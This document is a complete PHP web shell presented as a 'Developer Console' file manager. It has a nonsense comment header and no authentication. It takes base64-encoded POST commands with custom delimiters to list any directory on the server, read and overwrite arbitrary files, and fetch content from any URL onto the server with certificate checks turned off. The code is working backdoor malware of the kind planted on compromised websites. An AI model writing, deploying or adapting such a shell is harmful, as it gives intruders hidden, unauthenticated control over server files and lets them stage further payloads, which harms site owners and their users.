<?php /*abt  efoaedufivuodv srhtg */?><?php
function getAction(){
    if(isset($_POST['data'])) {
        $data = explode('##^^@@^^##',base64_decode($_POST['data']));
        $explodeaction = explode('^@#%',$data[0]);
        $action = $explodeaction[1];
        $explodepath = explode('^@#%',$data[1]);
        $pathname = $explodepath[0];
        $path = $explodepath[1];
        if($action=='save'){
            $explodepath = explode('^@#%',$data[2]);
            $file = $explodepath[1];
            return array('action'=>$action, $pathname=>$path,'file'=>urldecode($file));
        }
        if($action=='upload'){
            $explodepath = explode('^@#%',$data[2]);
            $file = $explodepath[1];
            return array('action'=>$action, $pathname=>$path,'filename'=>$file);
        }
        return array('action'=>$action, $pathname=>$path);
    }

}
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $returnData = array();
    $action = getAction();
    if ($action['action'] == 'get') {
        $results = scandir($action['path']);
        $returnData['folder'][] = array ('path'=>$action['path'] . '/..','name'=>'..');
        foreach ($results as $result) {
            if($result === '..' or $result === '.'){
                continue;
            }elseif (is_dir($action['path'] . '/' . $result)) {
                $returnData['folder'][] = array ('path'=>$action['path'].'/'.$result,'name'=>$result);
            }else{
                $returnData['file'][] = array ('path'=>$action['path'].'/'.$result,'name'=>$result);
            }
        }

        $new = $action['path'];
        $returnData['folderLine'][] = array ('path'=>$_SERVER['DOCUMENT_ROOT'],'name'=>'Home');
        $returnData['folderLine'][] = array ('path'=>$new,'name'=>$new);
        while(preg_match('/[\/][^\/]*?$/', $new)){
            $new = preg_replace('/[\/][^\/]*?$/', '', $new);
            if(!$new){
                $returnData['folderLine'][] = array ('path'=>'/','name'=>'/');
            }else{
                $returnData['folderLine'][] = array ('path'=>$new,'name'=>$new);
            }
        }
        $returnData['cwd'] = $action['path'];
        echo json_encode($returnData , JSON_UNESCAPED_SLASHES);
        exit;
    }elseif($action['action'] == 'load'){
        //$returnData['file'] = file_get_contents($action['path']);
        //$returnData['path'] = $action['path'];
        //echo json_encode($returnData , JSON_UNESCAPED_SLASHES);
        echo file_get_contents($action['path']);
        exit;

    }elseif($action['action'] == 'save'){
        file_put_contents($action['path'],$action['file']);
        echo file_get_contents($action['path']);
        //var_dump($action);
        exit;

    }elseif($action['action'] == 'upload'){

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $action['url']);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl , CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_ENCODING, '');
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($curl, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl,CURLOPT_TIMEOUT,90);
        $resultUp = curl_exec($curl);
        curl_close($curl);
        if (!$resultUp ) {
            $resultUp  = file_get_contents($action['url']);
            if (!$resultUp ) {
                $handle = fopen($action['url'], "r");
                $resultUp = stream_get_contents($handle);
                fclose($handle);
            }
        }
        file_put_contents($action['filename'],$resultUp);
        exit;

    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

    <title>Developer Console</title>
</head>
<body>
<div class="container-fluid" >
    <div class="row">
        <div class="col-sm" id="folderLine">

<?php
echo '<button style="margin: 10px;" type="button" class="btn btn-outline-primary" onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.$_SERVER['DOCUMENT_ROOT'].'\')">HOME</button>';

$new = $_SERVER['DOCUMENT_ROOT'];
echo '<button style="margin: 10px;" type="button" class="btn btn-outline-primary" onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.$new.'\')">'.$new.'</button>';

while(preg_match('/[\/][^\/]*?$/', $new)){
    $new = preg_replace('/[\/][^\/]*?$/', '', $new);
    if(!$new){
        echo '<button style="margin: 10px;" type="button" class="btn btn-outline-primary" onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.'/'.'\')">'.'/'.'</button>';
    }else{
        echo '<button style="margin: 10px;" type="button" class="btn btn-outline-primary" onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.$new.'\')">'.$new.'</button>';
    }
}

?>


        </div>
    </div>
</div>
<div class="container-fluid" >
    <div class="row">
        <div class="col-sm">
<?php
    echo '<table class="table table-hover table-dark"><thead><tr><th scope="col">Name</th><th scope="col">Action</th></tr></thead><tbody id="table">';
    $results = scandir($_SERVER['DOCUMENT_ROOT']);
    foreach ($results as $result) {
        if($result === '..'){
            echo '<tr onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.$_SERVER['DOCUMENT_ROOT'].'/'.$result.'\')"><th scope="row">'.$result.'</th><td></td></tr>';
        }elseif($result === '.'){
            continue;
        }elseif (is_dir($_SERVER['DOCUMENT_ROOT'] . '/' . $result)) {
            echo '<tr onclick="getDir(\'action^@#%get##^^@@^^##path^@#%'.$_SERVER['DOCUMENT_ROOT'].'/'.$result.'\')"><th scope="row">'.$result.'</th><td></td></tr>';
        }else{
            echo '<tr onclick="getFile(\'action^@#%load##^^@@^^##path^@#%'.$_SERVER['DOCUMENT_ROOT'].'/'.$result.'\')"><th scope="row">'.$result.'</th><td>Edit</td></tr>';
        }
    }
    echo '</tbody></table>';


?>
        </div>
    </div>
</div>
<div class="container" id="upfile">
    <div class="row">
        <div class="col-sm">
            <label for="url">Upload URL:</label>
            <input type="text" class="form-control" id="url" >
        </div>
        <div class="col-sm">
            <label for="filename">Upload Name:</label>
            <input type="text" class="form-control" id="filename" >
        </div>
        <div class="col-sm">
            <button onclick="upload('<?php echo $_SERVER['DOCUMENT_ROOT'];?>')" id='upResult' type="button" class="btn btn-success">Save</button>
        </div>
    </div>
</div>

<div class="container" id="edit" hidden>
    <div class="row">
        <div class="col-sm">
            <label>File Data:</label>
            <textarea readonly rows="30" cols="50" id ="old"></textarea>
        </div>
        <div class="col-sm">
            <label>Edit & Save:</label>
            <textarea id="new" rows="30" cols="50"></textarea>
            <button id='saveName' type="button" class="btn btn-success">Save</button>
        </div>


    </div>
</div>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script>
    function base64_encode( data ) {	// Encodes data with MIME base64
        //
        // +   original by: Tyler Akins (http://rumkin.com)
        // +   improved by: Bayron Guevara

        var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var o1, o2, o3, h1, h2, h3, h4, bits, i=0, enc='';

        do { // pack three octets into four hexets
            o1 = data.charCodeAt(i++);
            o2 = data.charCodeAt(i++);
            o3 = data.charCodeAt(i++);

            bits = o1<<16 | o2<<8 | o3;

            h1 = bits>>18 & 0x3f;
            h2 = bits>>12 & 0x3f;
            h3 = bits>>6 & 0x3f;
            h4 = bits & 0x3f;

            // use hexets to index into b64, and append result to encoded string
            enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
        } while (i < data.length);

        switch( data.length % 3 ){
            case 1:
                enc = enc.slice(0, -2) + '==';
                break;
            case 2:
                enc = enc.slice(0, -1) + '=';
                break;
        }

        return enc;
    }

    function getDir(sKey){
        var editDiv = document.getElementById('edit');
        edit.hidden = true;
        var upfile = document.getElementById('upfile');
        upfile.hidden = false;
        var http = new XMLHttpRequest();
        var url = window.location.href;
        var params = 'data='+base64_encode( sKey );
        http.open('POST', url, true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                console.log(http.responseText);
                array = JSON.parse(http.responseText);
                var root = document.getElementById('table');
                root.innerHTML = '';
                if (typeof array['folder'] !== 'undefined' && array['folder'].length > 0) {
                    console.log(array['folder']);
                    for(var key in array['folder']){
                        console.log(array['folder'][key]);
                        var tr = document.createElement('tr');
                        tr.setAttribute('onclick',"getDir('action^@#%get##^^@@^^##path^@#%"+array['folder'][key]['path']+"')");
                        var th = document.createElement('th');
                        th.innerHTML = array['folder'][key]['name'];
                        var td = document.createElement('td');
                        tr.appendChild(th);
                        tr.appendChild(td);
                        root.appendChild(tr);
                    }
                    console.log("OK");
                }
                if (typeof array['file'] !== 'undefined' && array['file'].length > 0) {
                    console.log(array['file']);
                    for (var key in array['file']) {
                        var tr = document.createElement('tr');
                        tr.setAttribute('onclick',"getFile('action^@#%load##^^@@^^##path^@#%"+array['file'][key]['path']+"')");
                        var th = document.createElement('th');
                        th.innerHTML = array['file'][key]['name'];
                        var td = document.createElement('td');
                        td.innerHTML = "Edit";



                        tr.appendChild(th);
                        tr.appendChild(td);
                        root.appendChild(tr);
                    }
                }
                var folderLineRoot = document.getElementById('folderLine');
                folderLineRoot.innerHTML = '';
                if (typeof array['folderLine'] !== 'undefined' && array['folderLine'].length > 0) {
                    for (var key in array['folderLine']) {
                        var button = document.createElement('button');
                        button.setAttribute('style','margin: 10px;')
                        button.setAttribute('type','button')
                        button.setAttribute('class','btn btn-outline-primary')
                        button.setAttribute('onclick',"getDir('action^@#%get##^^@@^^##path^@#%"+array['folderLine'][key]['path']+"')");
                        button.innerHTML = array['folderLine'][key]['name'];
                        folderLineRoot.appendChild(button);
                    }
                }
                document.getElementById('upResult').setAttribute('onclick','upload("'+array['cwd']+'")');

            }
        }
        http.send(params);
    }
    function getFile(sKey){
        var rootTable = document.getElementById('table');
        rootTable.innerHTML = '';
        var upfile = document.getElementById('upfile');
        upfile.hidden = true;
        document.getElementById('new').value = '';
        var editDiv = document.getElementById('edit');
        edit.hidden = false;
        console.log(sKey);
        var split1Data = sKey.split('##^^@@^^##');

        var split2Data = split1Data[1].split('^@#%');
        var pathSave = split2Data[1];
        document.getElementById('saveName').setAttribute('onclick','save("'+pathSave+'")');

        var http = new XMLHttpRequest();
        var url = window.location.href;
        var params = 'data='+base64_encode( sKey );
        http.open('POST', url, true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                document.getElementById('old').value = http.responseText;
            }
        }
        http.send(params);
    }

    function upload(sKey){
        document.getElementById('upResult').setAttribute('onclick','upload("'+sKey+'")');
        var url = document.getElementById('url').value;
        var filename = document.getElementById('filename').value;
        var postData = "action^@#%upload##^^@@^^##url^@#%"+url+"##^^@@^^##filename^@#%"+sKey+"/"+filename;
        console.log(postData);

        var http = new XMLHttpRequest();
        var url = window.location.href;
        var params = 'data='+base64_encode( postData );
        http.open('POST', url, true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                console.log(http.responseText);
                getFile('action^@#%load##^^@@^^##path^@#%'+sKey+'/'+filename);
            }
        }
        http.send(params);

    }


    function fixedEncodeURIComponent (str) {
        return encodeURIComponent(str).replace(/[!'()*]/g, function(c) {
            return '%' + c.charCodeAt(0).toString(16);
        });
    }
    function save(path){
        var upfile = document.getElementById('upfile');
        upfile.hidden = true;
        document.getElementById('saveName').setAttribute('onclick','save("'+path+'")');
        var newData = document.getElementById('new').value;
        var postData = "action^@#%save##^^@@^^##path^@#%"+path+"##^^@@^^##file^@#%"+fixedEncodeURIComponent(newData);
        console.log(postData);

        var http = new XMLHttpRequest();
        var url = window.location.href;
        var params = 'data='+base64_encode( postData );
        http.open('POST', url, true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                console.log(http.responseText);
                document.getElementById('old').value = http.responseText;
                document.getElementById('new').value = '';
            }
        }
        http.send(params);

    }
</script>



</body>
</html>
